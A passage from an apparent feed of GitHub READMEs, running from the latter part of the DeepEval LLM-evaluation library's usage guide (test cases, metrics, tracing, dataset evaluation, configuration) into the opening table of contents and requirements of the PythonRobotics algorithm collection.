def test_case():
    correctness_metric = GEval(
        name="Correctness",
        criteria="Determine if the 'actual output' is correct based on the 'expected output'.",
        evaluation_params=[LLMTestCaseParams.ACTUAL_OUTPUT, LLMTestCaseParams.EXPECTED_OUTPUT],
        threshold=0.5
    )
    test_case = LLMTestCase(
        input="What if these shoes don't fit?",
        # Replace this with the actual output from your LLM application
        actual_output="You have 30 days to get a full refund at no extra cost.",
        expected_output="We offer a 30-day full refund at no extra costs.",
        retrieval_context=["All customers are eligible for a 30 day full refund at no extra costs."]
    )
    assert_test(test_case, [correctness_metric])
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Set your &lt;code&gt;OPENAI_API_KEY&lt;/code&gt; as an environment variable (you can also evaluate using your own custom model, for more details visit &lt;a href="https://deepeval.com/docs/metrics-introduction#using-a-custom-llm?utm_source=GitHub"&gt;this part of our docs&lt;/a&gt;):&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;export OPENAI_API_KEY="..."
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;And finally, run &lt;code&gt;test_chatbot.py&lt;/code&gt; in the CLI:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;deepeval test run test_chatbot.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Congratulations! Your test case should have passed ‚úÖ&lt;/strong&gt; Let's breakdown what happened.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;The variable &lt;code&gt;input&lt;/code&gt; mimics a user input, and &lt;code&gt;actual_output&lt;/code&gt; is a placeholder for what your application's supposed to output based on this input.&lt;/li&gt; 
 &lt;li&gt;The variable &lt;code&gt;expected_output&lt;/code&gt; represents the ideal answer for a given &lt;code&gt;input&lt;/code&gt;, and &lt;a href="https://deepeval.com/docs/metrics-llm-evals"&gt;&lt;code&gt;GEval&lt;/code&gt;&lt;/a&gt; is a research-backed metric provided by &lt;code&gt;deepeval&lt;/code&gt; for you to evaluate your LLM output's on any custom with human-like accuracy.&lt;/li&gt; 
 &lt;li&gt;In this example, the metric &lt;code&gt;criteria&lt;/code&gt; is correctness of the &lt;code&gt;actual_output&lt;/code&gt; based on the provided &lt;code&gt;expected_output&lt;/code&gt;.&lt;/li&gt; 
 &lt;li&gt;All metric scores range from 0 - 1, which the &lt;code&gt;threshold=0.5&lt;/code&gt; threshold ultimately determines if your test have passed or not.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;a href="https://deepeval.com/docs/getting-started?utm_source=GitHub"&gt;Read our documentation&lt;/a&gt; for more information on more options to run end-to-end evaluation, how to use additional metrics, create your own custom metrics, and tutorials on how to integrate with other tools like LangChain and LlamaIndex.&lt;/p&gt; 
&lt;br /&gt; 
&lt;h2&gt;Evaluating Nested Components&lt;/h2&gt; 
&lt;p&gt;If you wish to evaluate individual components within your LLM app, you need to run &lt;strong&gt;component-level&lt;/strong&gt; evals - a powerful way to evaluate any component within an LLM system.&lt;/p&gt; 
&lt;p&gt;Simply trace "components" such as LLM calls, retrievers, tool calls, and agents within your LLM application using the &lt;code&gt;@observe&lt;/code&gt; decorator to apply metrics on a component-level. Tracing with &lt;code&gt;deepeval&lt;/code&gt; is non-instrusive (learn more &lt;a href="https://deepeval.com/docs/evaluation-llm-tracing#dont-be-worried-about-tracing"&gt;here&lt;/a&gt;) and helps you avoid rewriting your codebase just for evals:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;from deepeval.tracing import observe, update_current_span
from deepeval.test_case import LLMTestCase
from deepeval.dataset import Golden
from deepeval.metrics import GEval
from deepeval import evaluate

correctness = GEval(name="Correctness", criteria="Determine if the 'actual output' is correct based on the 'expected output'.", evaluation_params=[LLMTestCaseParams.ACTUAL_OUTPUT, LLMTestCaseParams.EXPECTED_OUTPUT])

@observe(metrics=[correctness])
def inner_component():
    # Component can be anything from an LLM call, retrieval, agent, tool use, etc.
    update_current_span(test_case=LLMTestCase(input="...", actual_output="..."))
    return

@observe
def llm_app(input: str):
    inner_component()
    return

evaluate(observed_callback=llm_app, goldens=[Golden(input="Hi!")])
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You can learn everything about component-level evaluations &lt;a href="https://www.deepeval.com/docs/evaluation-component-level-llm-evals"&gt;here.&lt;/a&gt;&lt;/p&gt; 
&lt;br /&gt; 
&lt;h2&gt;Evaluating Without Pytest Integration&lt;/h2&gt; 
&lt;p&gt;Alternatively, you can evaluate without Pytest, which is more suited for a notebook environment.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;from deepeval import evaluate
from deepeval.metrics import AnswerRelevancyMetric
from deepeval.test_case import LLMTestCase

answer_relevancy_metric = AnswerRelevancyMetric(threshold=0.7)
test_case = LLMTestCase(
    input="What if these shoes don't fit?",
    # Replace this with the actual output from your LLM application
    actual_output="We offer a 30-day full refund at no extra costs.",
    retrieval_context=["All customers are eligible for a 30 day full refund at no extra costs."]
)
evaluate([test_case], [answer_relevancy_metric])
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Using Standalone Metrics&lt;/h2&gt; 
&lt;p&gt;DeepEval is extremely modular, making it easy for anyone to use any of our metrics. Continuing from the previous example:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;from deepeval.metrics import AnswerRelevancyMetric
from deepeval.test_case import LLMTestCase

answer_relevancy_metric = AnswerRelevancyMetric(threshold=0.7)
test_case = LLMTestCase(
    input="What if these shoes don't fit?",
    # Replace this with the actual output from your LLM application
    actual_output="We offer a 30-day full refund at no extra costs.",
    retrieval_context=["All customers are eligible for a 30 day full refund at no extra costs."]
)

answer_relevancy_metric.measure(test_case)
print(answer_relevancy_metric.score)
# All metrics also offer an explanation
print(answer_relevancy_metric.reason)
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Note that some metrics are for RAG pipelines, while others are for fine-tuning. Make sure to use our docs to pick the right one for your use case.&lt;/p&gt; 
&lt;h2&gt;Evaluating a Dataset / Test Cases in Bulk&lt;/h2&gt; 
&lt;p&gt;In DeepEval, a dataset is simply a collection of test cases. Here is how you can evaluate these in bulk:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;import pytest
from deepeval import assert_test
from deepeval.dataset import EvaluationDataset, Golden
from deepeval.metrics import AnswerRelevancyMetric
from deepeval.test_case import LLMTestCase

dataset = EvaluationDataset(goldens=[Golden(input="What's the weather like today?")])

for golden in dataset.goldens:
    test_case = LLMTestCase(
        input=golden.input,
        actual_output=your_llm_app(golden.input)
    )
    dataset.add_test_case(test_case)

@pytest.mark.parametrize(
    "test_case",
    dataset.test_cases,
)
def test_customer_chatbot(test_case: LLMTestCase):
    answer_relevancy_metric = AnswerRelevancyMetric(threshold=0.5)
    assert_test(test_case, [answer_relevancy_metric])
&lt;/code&gt;&lt;/pre&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# Run this in the CLI, you can also add an optional -n flag to run tests in parallel
deepeval test run test_&amp;lt;filename&amp;gt;.py -n 4
&lt;/code&gt;&lt;/pre&gt; 
&lt;br /&gt; 
&lt;p&gt;Alternatively, although we recommend using &lt;code&gt;deepeval test run&lt;/code&gt;, you can evaluate a dataset/test cases without using our Pytest integration:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;from deepeval import evaluate
...

evaluate(dataset, [answer_relevancy_metric])
# or
dataset.evaluate([answer_relevancy_metric])
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;A Note on Env Variables (.env / .env.local)&lt;/h2&gt; 
&lt;p&gt;DeepEval auto-loads &lt;code&gt;.env.local&lt;/code&gt; then &lt;code&gt;.env&lt;/code&gt; from the current working directory &lt;strong&gt;at import time&lt;/strong&gt;. &lt;strong&gt;Precedence:&lt;/strong&gt; process env -&amp;gt; &lt;code&gt;.env.local&lt;/code&gt; -&amp;gt; &lt;code&gt;.env&lt;/code&gt;. Opt out with &lt;code&gt;DEEPEVAL_DISABLE_DOTENV=1&lt;/code&gt;.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;cp .env.example .env.local
# then edit .env.local (ignored by git)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h1&gt;DeepEval With Confident AI&lt;/h1&gt; 
&lt;p&gt;DeepEval is available on &lt;a href="https://confident-ai.com?utm_source=Github"&gt;Confident AI&lt;/a&gt;, an evals &amp;amp; observability platform that allows you to:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Curate/annotate evaluation datasets on the cloud&lt;/li&gt; 
 &lt;li&gt;Benchmark LLM app using dataset, and compare with previous iterations to experiment which models/prompts works best&lt;/li&gt; 
 &lt;li&gt;Fine-tune metrics for custom results&lt;/li&gt; 
 &lt;li&gt;Debug evaluation results via LLM traces&lt;/li&gt; 
 &lt;li&gt;Monitor &amp;amp; evaluate LLM responses in product to improve datasets with real-world data&lt;/li&gt; 
 &lt;li&gt;Repeat until perfection&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;Everything on Confident AI, including how to use Confident is available &lt;a href="https://www.confident-ai.com/docs?utm_source=GitHub"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;To begin, login from the CLI:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;deepeval login
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Follow the instructions to log in, create your account, and paste your API key into the CLI.&lt;/p&gt; 
&lt;p&gt;Now, run your test file again:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;deepeval test run test_chatbot.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You should see a link displayed in the CLI once the test has finished running. Paste it into your browser to view the results!&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/confident-ai/deepeval/main/assets/demo.gif" alt="Demo GIF" /&gt;&lt;/p&gt; 
&lt;br /&gt; 
&lt;h2&gt;Configuration&lt;/h2&gt; 
&lt;h3&gt;Environment variables via .env files&lt;/h3&gt; 
&lt;p&gt;Using &lt;code&gt;.env.local&lt;/code&gt; or &lt;code&gt;.env&lt;/code&gt; is optional. If they are missing, DeepEval uses your existing environment variables. When present, dotenv environment variables are auto-loaded at import time (unless you set &lt;code&gt;DEEPEVAL_DISABLE_DOTENV=1&lt;/code&gt;).&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Precedence:&lt;/strong&gt; process env -&amp;gt; &lt;code&gt;.env.local&lt;/code&gt; -&amp;gt; &lt;code&gt;.env&lt;/code&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;cp .env.example .env.local
# then edit .env.local (ignored by git)
&lt;/code&gt;&lt;/pre&gt; 
&lt;br /&gt; 
&lt;h1&gt;Contributing&lt;/h1&gt; 
&lt;p&gt;Please read &lt;a href="https://github.com/confident-ai/deepeval/raw/main/CONTRIBUTING.md"&gt;CONTRIBUTING.md&lt;/a&gt; for details on our code of conduct, and the process for submitting pull requests to us.&lt;/p&gt; 
&lt;br /&gt; 
&lt;h1&gt;Roadmap&lt;/h1&gt; 
&lt;p&gt;Features:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;input type="checkbox" checked disabled /&gt; Integration with Confident AI&lt;/li&gt; 
 &lt;li&gt;&lt;input type="checkbox" checked disabled /&gt; Implement G-Eval&lt;/li&gt; 
 &lt;li&gt;&lt;input type="checkbox" checked disabled /&gt; Implement RAG metrics&lt;/li&gt; 
 &lt;li&gt;&lt;input type="checkbox" checked disabled /&gt; Implement Conversational metrics&lt;/li&gt; 
 &lt;li&gt;&lt;input type="checkbox" checked disabled /&gt; Evaluation Dataset Creation&lt;/li&gt; 
 &lt;li&gt;&lt;input type="checkbox" checked disabled /&gt; Red-Teaming&lt;/li&gt; 
 &lt;li&gt;&lt;input type="checkbox" disabled /&gt; DAG custom metrics&lt;/li&gt; 
 &lt;li&gt;&lt;input type="checkbox" disabled /&gt; Guardrails&lt;/li&gt; 
&lt;/ul&gt; 
&lt;br /&gt; 
&lt;h1&gt;Authors&lt;/h1&gt; 
&lt;p&gt;Built by the founders of Confident AI. Contact &lt;a href="mailto:jeffreyip@confident-ai.com"&gt;jeffreyip@confident-ai.com&lt;/a&gt; for all enquiries.&lt;/p&gt; 
&lt;br /&gt; 
&lt;h1&gt;License&lt;/h1&gt; 
&lt;p&gt;DeepEval is licensed under Apache 2.0 - see the &lt;a href="https://github.com/confident-ai/deepeval/raw/main/LICENSE.md"&gt;LICENSE.md&lt;/a&gt; file for details.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>AtsushiSakai/PythonRobotics</title>
      <link>https://github.com/AtsushiSakai/PythonRobotics</link>
      <description>&lt;p&gt;Python sample codes and textbook for robotics algorithms.&lt;/p&gt;&lt;hr&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRobotics/raw/master/icon.png?raw=true" align="right" width="300" alt="header pic" /&gt; 
&lt;h1&gt;PythonRobotics&lt;/h1&gt; 
&lt;p&gt;&lt;img src="https://github.com/AtsushiSakai/PythonRobotics/workflows/Linux_CI/badge.svg?sanitize=true" alt="GitHub_Action_Linux_CI" /&gt; &lt;img src="https://github.com/AtsushiSakai/PythonRobotics/workflows/MacOS_CI/badge.svg?sanitize=true" alt="GitHub_Action_MacOS_CI" /&gt; &lt;img src="https://github.com/AtsushiSakai/PythonRobotics/workflows/Windows_CI/badge.svg?sanitize=true" alt="GitHub_Action_Windows_CI" /&gt; &lt;a href="https://ci.appveyor.com/project/AtsushiSakai/pythonrobotics"&gt;&lt;img src="https://ci.appveyor.com/api/projects/status/sb279kxuv1be391g?svg=true" alt="Build status" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Python codes and &lt;a href="https://atsushisakai.github.io/PythonRobotics/index.html"&gt;textbook&lt;/a&gt; for robotics algorithm.&lt;/p&gt; 
&lt;h1&gt;Table of Contents&lt;/h1&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#what-is-this"&gt;What is this?&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#requirements"&gt;Requirements&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#documentation"&gt;Documentation&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#how-to-use"&gt;How to use&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#localization"&gt;Localization&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#extended-kalman-filter-localization"&gt;Extended Kalman Filter localization&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#particle-filter-localization"&gt;Particle filter localization&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#histogram-filter-localization"&gt;Histogram filter localization&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#mapping"&gt;Mapping&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#gaussian-grid-map"&gt;Gaussian grid map&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#ray-casting-grid-map"&gt;Ray casting grid map&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#lidar-to-grid-map"&gt;Lidar to grid map&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#k-means-object-clustering"&gt;k-means object clustering&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#rectangle-fitting"&gt;Rectangle fitting&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#slam"&gt;SLAM&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#iterative-closest-point-icp-matching"&gt;Iterative Closest Point (ICP) Matching&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#fastslam-10"&gt;FastSLAM 1.0&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#path-planning"&gt;Path Planning&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#dynamic-window-approach"&gt;Dynamic Window Approach&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#grid-based-search"&gt;Grid based search&lt;/a&gt; 
    &lt;ul&gt; 
     &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#dijkstra-algorithm"&gt;Dijkstra algorithm&lt;/a&gt;&lt;/li&gt; 
     &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#a-algorithm"&gt;A* algorithm&lt;/a&gt;&lt;/li&gt; 
     &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#d-algorithm"&gt;D* algorithm&lt;/a&gt;&lt;/li&gt; 
     &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#d-lite-algorithm"&gt;D* Lite algorithm&lt;/a&gt;&lt;/li&gt; 
     &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#potential-field-algorithm"&gt;Potential Field algorithm&lt;/a&gt;&lt;/li&gt; 
     &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#grid-based-coverage-path-planning"&gt;Grid based coverage path planning&lt;/a&gt;&lt;/li&gt; 
     &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#particle-swarm-optimization-pso"&gt;Particle Swarm Optimization (PSO)&lt;/a&gt;&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#state-lattice-planning"&gt;State Lattice Planning&lt;/a&gt; 
    &lt;ul&gt; 
     &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#biased-polar-sampling"&gt;Biased polar sampling&lt;/a&gt;&lt;/li&gt; 
     &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#lane-sampling"&gt;Lane sampling&lt;/a&gt;&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#probabilistic-road-map-prm-planning"&gt;Probabilistic Road-Map (PRM) planning&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#rapidly-exploring-random-trees-rrt"&gt;Rapidly-Exploring Random Trees (RRT)&lt;/a&gt; 
    &lt;ul&gt; 
     &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#rrt"&gt;RRT*&lt;/a&gt;&lt;/li&gt; 
     &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#rrt-with-reeds-shepp-path"&gt;RRT* with reeds-shepp path&lt;/a&gt;&lt;/li&gt; 
     &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#lqr-rrt"&gt;LQR-RRT*&lt;/a&gt;&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#quintic-polynomials-planning"&gt;Quintic polynomials planning&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#reeds-shepp-planning"&gt;Reeds Shepp planning&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#lqr-based-path-planning"&gt;LQR based path planning&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#optimal-trajectory-in-a-frenet-frame"&gt;Optimal Trajectory in a Frenet Frame&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#path-tracking"&gt;Path Tracking&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#move-to-a-pose-control"&gt;move to a pose control&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#stanley-control"&gt;Stanley control&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#rear-wheel-feedback-control"&gt;Rear wheel feedback control&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#linearquadratic-regulator-lqr-speed-and-steering-control"&gt;Linear‚Äìquadratic regulator (LQR) speed and steering control&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#model-predictive-speed-and-steering-control"&gt;Model predictive speed and steering control&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#nonlinear-model-predictive-control-with-c-gmres"&gt;Nonlinear Model predictive control with C-GMRES&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#arm-navigation"&gt;Arm Navigation&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#n-joint-arm-to-point-control"&gt;N joint arm to point control&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#arm-navigation-with-obstacle-avoidance"&gt;Arm navigation with obstacle avoidance&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#aerial-navigation"&gt;Aerial Navigation&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#drone-3d-trajectory-following"&gt;drone 3d trajectory following&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#rocket-powered-landing"&gt;rocket powered landing&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#bipedal"&gt;Bipedal&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#bipedal-planner-with-inverted-pendulum"&gt;bipedal planner with inverted pendulum&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#license"&gt;License&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#use-case"&gt;Use-case&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#contribution"&gt;Contribution&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#citing"&gt;Citing&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#support"&gt;Support&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#sponsors"&gt;Sponsors&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#JetBrains"&gt;JetBrains&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#1password"&gt;1Password&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/AtsushiSakai/PythonRobotics/master/#authors"&gt;Authors&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;What is PythonRobotics?&lt;/h1&gt; 
&lt;p&gt;PythonRobotics is a Python code collection and a &lt;a href="https://atsushisakai.github.io/PythonRobotics/index.html"&gt;textbook&lt;/a&gt; of robotics algorithms.&lt;/p&gt; 
&lt;p&gt;Features:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;Easy to read for understanding each algorithm's basic idea.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Widely used and practical algorithms are selected.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Minimum dependency.&lt;/p&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;See this documentation&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://atsushisakai.github.io/PythonRobotics/modules/0_getting_started/1_what_is_python_robotics.html"&gt;Getting Started ‚Äî PythonRobotics documentation&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;or this Youtube video:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=uMeRnNoJAfU"&gt;PythonRobotics project audio overview&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;or this paper for more details:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://arxiv.org/abs/1808.10703"&gt;[1808.10703] PythonRobotics: a Python code collection of robotics algorithms&lt;/a&gt; (&lt;a href="https://github.com/AtsushiSakai/PythonRoboticsPaper/raw/master/python_robotics.bib"&gt;BibTeX&lt;/a&gt;)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;Requirements to run the code&lt;/h1&gt; 
&lt;p&gt;For running each sample code:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://www.python.org/"&gt;Python 3.13.x&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://numpy.org/"&gt;NumPy&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://scipy.org/"&gt;SciPy&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://matplotlib.org/"&gt;Matplotlib&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://www.cvxpy.org/"&gt;cvxpy&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;For development:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://pytest.org/"&gt;pytest&lt;/a&gt; (for unit tests)&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://pypi.org/project/pytest-xdist/"&gt;pytest-xdist&lt;/a&gt; (for parallel unit tests)&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://mypy-lang.org/"&gt;mypy&lt;/a&gt; (for type check)&lt;/p&gt; &lt;/li&gt; 
